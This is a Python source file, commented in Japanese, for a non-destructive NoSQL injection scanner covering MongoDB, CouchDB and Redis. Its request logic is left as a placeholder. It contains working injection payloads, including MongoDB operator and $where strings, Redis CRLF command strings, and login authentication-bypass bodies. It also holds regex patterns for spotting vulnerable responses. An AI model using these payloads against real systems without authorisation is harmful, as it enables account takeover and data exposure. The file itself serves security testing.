"""
NoSQL Injection Tester - NoSQLデータベースインジェクション検出

MongoDB、CouchDB、Redis等のNoSQLデータベースに対する
インジェクション脆弱性を検出する非破壊的テスター。

⚠️ 注意: 検出のみ、データ破壊は行わない
"""

import logging
import json
import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any
from enum import Enum

logger = logging.getLogger(__name__)


class NoSQLDatabase(Enum):
    """NoSQLデータベースタイプ"""
    MONGODB = "mongodb"
    COUCHDB = "couchdb"
    REDIS = "redis"
    CASSANDRA = "cassandra"
    UNKNOWN = "unknown"


class InjectionType(Enum):
    """インジェクションタイプ"""
    OPERATOR = "operator"           # $ne, $gt 等のオペレーター
    JAVASCRIPT = "javascript"       # $where 等のJS実行
    UNION = "union"                 # Union-like攻撃
    BLIND = "blind"                 # ブラインドインジェクション
    AUTHENTICATION_BYPASS = "auth_bypass"  # 認証バイパス


@dataclass
class NoSQLInjectionResult:
    """NoSQLインジェクション検出結果"""
    url: str
    parameter: str
    database: NoSQLDatabase
    injection_type: InjectionType
    payload: str
    vulnerable: bool = False
    evidence: str = ""
    confidence: float = 0.0
    severity: str = "high"
    
    def to_dict(self) -> Dict:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "database": self.database.value,
            "type": self.injection_type.value,
            "payload": self.payload,
            "vulnerable": self.vulnerable,
            "confidence": self.confidence,
            "severity": self.severity,
        }


class NoSQLInjectionTester:
    """
    NoSQL Injection Tester
    
    機能:
    - MongoDB/CouchDB/Redis対応
    - オペレーターインジェクション検出
    - JavaScript実行インジェクション検出
    - 認証バイパス検出
    - ブラインドインジェクション（時間ベース）
    
    ⚠️ 非破壊的ペイロードのみ使用
    """
    
    # MongoDB オペレーターペイロード（非破壊的）
    MONGODB_OPERATOR_PAYLOADS = [
        # 基本的なオペレーター
        ('{"$ne": null}', "operator"),
        ('{"$ne": ""}', "operator"),
        ('{"$gt": ""}', "operator"),
        ('{"$gte": ""}', "operator"),
        # 認証バイパス
        ('{"$ne": 1}', "auth_bypass"),
        ('{"$regex": ".*"}', "operator"),
        ('{"$exists": true}', "operator"),
        # 配列オペレーター
        ('{"$in": [null, ""]}', "operator"),
        ('{"$nin": ["admin"]}', "operator"),
    ]
    
    # MongoDB URL パラメータ形式
    MONGODB_URL_PAYLOADS = [
        ("[$ne]=1", "operator"),
        ("[$gt]=", "operator"),
        ("[$regex]=.*", "operator"),
        ("[$exists]=true", "operator"),
        ("[$ne]=", "auth_bypass"),
    ]
    
    # JavaScript インジェクション（非破壊的）
    MONGODB_JS_PAYLOADS = [
        ('{"$where": "1==1"}', "javascript"),
        ('{"$where": "this.a==this.a"}', "javascript"),
        ("'; return true; var dummy='", "javascript"),
    ]
    
    # CouchDB ペイロード
    COUCHDB_PAYLOADS = [
        ('{"selector": {"_id": {"$gt": null}}}', "operator"),
        ('{"selector": {"password": {"$regex": ".*"}}}', "operator"),
    ]
    
    # Redis コマンドインジェクション（非破壊的）
    REDIS_PAYLOADS = [
        ("*\r\n", "operator"),
        ("\r\nINFO\r\n", "operator"),
        ("\r\nPING\r\n", "operator"),
    ]
    
    # 脆弱性を示すレスポンスパターン
    VULN_INDICATORS = {
        NoSQLDatabase.MONGODB: [
            r"MongoError",
            r"MongoDB",
            r"\$where",
            r"Cannot read property",
            r"Cast to ObjectId failed",
            r"BSONTypeError",
        ],
        NoSQLDatabase.COUCHDB: [
            r"CouchDB",
            r"database_not_found",
            r"invalid_json",
        ],
        NoSQLDatabase.REDIS: [
            r"WRONGTYPE",
            r"ERR",
            r"\+PONG",
        ],
    }
    
    def __init__(
        self,
        timeout: float = 10.0,
        delay: float = 0.5,
    ):
        """
        Args:
            timeout: HTTPタイムアウト（秒）
            delay: リクエスト間遅延（秒）
        """
        self.timeout = timeout
        self.delay = delay
        self.results: List[NoSQLInjectionResult] = []
    
    def test(
        self,
        url: str,
        parameters: List[str],
        method: str = "GET",
        database: Optional[NoSQLDatabase] = None,
        body_type: str = "json",  # "json" or "form"
    ) -> List[NoSQLInjectionResult]:
        """
        NoSQLインジェクションテスト
        
        Args:
            url: テスト対象URL
            parameters: テスト対象パラメータ
            method: HTTPメソッド
            database: ターゲットDB（Noneで自動検出）
            body_type: ボディタイプ
        
        Returns:
            検出結果リスト
        """
        results = []
        
        # データベース自動検出
        if database is None:
            database = self._detect_database(url)
        
        for param in parameters:
            param_results = self._test_parameter(
                url=url,
                parameter=param,
                method=method,
                database=database,
                body_type=body_type,
            )
            results.extend(param_results)
            self.results.extend(param_results)
        
        return results
    
    def _detect_database(self, url: str) -> NoSQLDatabase:
        """データベースタイプを推測"""
        url_lower = url.lower()
        
        if "mongo" in url_lower or ":27017" in url_lower:
            return NoSQLDatabase.MONGODB
        elif "couch" in url_lower or ":5984" in url_lower:
            return NoSQLDatabase.COUCHDB
        elif "redis" in url_lower or ":6379" in url_lower:
            return NoSQLDatabase.REDIS
        
        # デフォルトはMongoDB（最も一般的）
        return NoSQLDatabase.MONGODB
    
    def _test_parameter(
        self,
        url: str,
        parameter: str,
        method: str,
        database: NoSQLDatabase,
        body_type: str,
    ) -> List[NoSQLInjectionResult]:
        """単一パラメータのテスト"""
        results = []
        payloads = self._get_payloads(database, body_type)
        
        for payload, inj_type in payloads:
            result = self._test_payload(
                url=url,
                parameter=parameter,
                payload=payload,
                injection_type=InjectionType(inj_type),
                database=database,
                method=method,
            )
            if result and result.vulnerable:
                results.append(result)
        
        return results
    
    def _get_payloads(
        self, 
        database: NoSQLDatabase,
        body_type: str,
    ) -> List[tuple]:
        """データベースとボディタイプに応じたペイロード取得"""
        if database == NoSQLDatabase.MONGODB:
            if body_type == "json":
                return self.MONGODB_OPERATOR_PAYLOADS + self.MONGODB_JS_PAYLOADS
            else:
                return self.MONGODB_URL_PAYLOADS
        elif database == NoSQLDatabase.COUCHDB:
            return self.COUCHDB_PAYLOADS
        elif database == NoSQLDatabase.REDIS:
            return self.REDIS_PAYLOADS
        
        return self.MONGODB_URL_PAYLOADS  # デフォルト
    
    def _test_payload(
        self,
        url: str,
        parameter: str,
        payload: str,
        injection_type: InjectionType,
        database: NoSQLDatabase,
        method: str,
    ) -> Optional[NoSQLInjectionResult]:
        """
        単一ペイロードテスト（プレースホルダー）
        
        NOTE: 実際の実装ではrequestsでリクエスト送信
        """
        logger.info(
            "Testing NoSQL injection: %s=%s on %s",
            parameter, payload[:30], url
        )
        
        result = NoSQLInjectionResult(
            url=url,
            parameter=parameter,
            database=database,
            injection_type=injection_type,
            payload=payload,
        )
        
        # プレースホルダー実装
        # 実際の実装:
        # 1. リクエスト送信
        # 2. レスポンス分析
        # 3. 脆弱性判定
        
        return result
    
    def _analyze_response(
        self,
        response_text: str,
        original_response: str,
        database: NoSQLDatabase,
    ) -> tuple:
        """
        レスポンス分析
        
        Returns:
            (vulnerable: bool, confidence: float, evidence: str)
        """
        # エラーパターン検出
        patterns = self.VULN_INDICATORS.get(database, [])
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return (True, 0.9, match.group(0))
        
        # レスポンス差異検出
        if len(response_text) != len(original_response):
            diff_ratio = abs(len(response_text) - len(original_response)) / max(len(original_response), 1)
            if diff_ratio > 0.3:
                return (True, 0.6, f"Response length diff: {diff_ratio:.1%}")
        
        # 追加データ検出（インジェクションで多くのデータが返された場合）
        try:
            orig_json = json.loads(original_response)
            resp_json = json.loads(response_text)
            
            if isinstance(resp_json, list) and isinstance(orig_json, list):
                if len(resp_json) > len(orig_json):
                    return (True, 0.7, f"More records returned: {len(resp_json)} vs {len(orig_json)}")
        except json.JSONDecodeError:
            pass
        
        return (False, 0.0, "")
    
    def test_authentication_bypass(
        self,
        url: str,
        username_param: str = "username",
        password_param: str = "password",
    ) -> List[NoSQLInjectionResult]:
        """
        認証バイパス専用テスト
        
        Args:
            url: ログインエンドポイント
            username_param: ユーザー名パラメータ
            password_param: パスワードパラメータ
        
        Returns:
            検出結果リスト
        """
        results = []
        
        # 認証バイパスペイロード
        bypass_payloads = [
            # ユーザー名バイパス
            ({username_param: {"$ne": ""}, password_param: {"$ne": ""}}, "both_ne"),
            ({username_param: {"$gt": ""}, password_param: {"$gt": ""}}, "both_gt"),
            ({username_param: "admin", password_param: {"$ne": ""}}, "admin_bypass"),
            ({username_param: {"$regex": "admin"}, password_param: {"$ne": ""}}, "regex_bypass"),
        ]
        
        for payload, variant in bypass_payloads:
            logger.info("Testing auth bypass: %s", variant)
            
            result = NoSQLInjectionResult(
                url=url,
                parameter=f"{username_param}+{password_param}",
                database=NoSQLDatabase.MONGODB,
                injection_type=InjectionType.AUTHENTICATION_BYPASS,
                payload=json.dumps(payload),
            )
            
            # プレースホルダー: 実際はリクエスト送信して認証成功か確認
            results.append(result)
        
        self.results.extend(results)
        return results
    
    def get_vulnerable(self) -> List[NoSQLInjectionResult]:
        """脆弱と判定された結果のみ"""
        return [r for r in self.results if r.vulnerable]
    
    def get_summary(self) -> Dict:
        """サマリー"""
        vuln_count = len(self.get_vulnerable())
        by_db = {}
        by_type = {}
        
        for r in self.results:
            by_db[r.database.value] = by_db.get(r.database.value, 0) + (1 if r.vulnerable else 0)
            by_type[r.injection_type.value] = by_type.get(r.injection_type.value, 0) + (1 if r.vulnerable else 0)
        
        return {
            "total_tests": len(self.results),
            "vulnerable": vuln_count,
            "by_database": by_db,
            "by_type": by_type,
        }
    
    def get_summary_for_ai(self) -> str:
        """AI向けサマリー"""
        summary = self.get_summary()
        return (
            f"NoSQL Injection Test: {summary['total_tests']} tests\n"
            f"Vulnerable: {summary['vulnerable']}\n"
            f"By database: {summary['by_database']}\n"
            f"By type: {summary['by_type']}"
        )


def create_nosql_tester(
    timeout: float = 10.0,
    delay: float = 0.5,
) -> NoSQLInjectionTester:
    """NoSQLInjectionTester作成ヘルパー"""
    return NoSQLInjectionTester(timeout=timeout, delay=delay)
